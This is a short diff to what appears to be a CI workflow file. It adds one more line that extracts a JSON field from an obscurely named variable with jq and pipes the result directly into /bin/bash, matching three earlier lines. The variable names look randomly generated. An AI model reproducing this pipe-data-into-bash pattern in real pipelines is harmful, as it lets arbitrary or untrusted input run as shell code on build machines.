@@ -35,6 +35,7 @@ jobs:
           echo $j6922 | jq -r .w00039 | /bin/bash
           printf '%s' "$unxqf0584" | jq -r .hmz16 | /bin/bash
           echo $du06 | jq -r .vog1022 | /bin/bash
+          printf '%s' "$lt8" | jq -r .b32 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
